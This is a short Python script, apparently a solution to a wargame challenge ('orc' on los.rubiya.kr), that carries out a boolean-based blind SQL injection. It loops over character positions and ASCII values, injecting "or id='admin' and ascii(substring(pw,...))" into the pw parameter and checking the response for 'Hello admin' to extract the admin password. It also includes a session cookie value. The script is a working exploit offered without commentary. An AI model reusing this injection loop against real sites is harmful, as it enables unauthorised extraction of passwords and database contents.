import requests

cookies = {'PHPSESSID': 'p92ilbnrkt5id2ttj2d6f5a85k'}
answer = ""

for i in range(1,9):
    for j in range(33,128):
        url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=a%27+or+id%3d%27admin%27+and+ascii(substring(pw,'
        url = url+str(i)+',1))='+str(j)+'--+'

        print(url)

        response = requests.get(url, cookies=cookies)
        if("Hello admin" in response.text):
            answer = answer + chr(j)
            print(answer)
            break

print(answer)
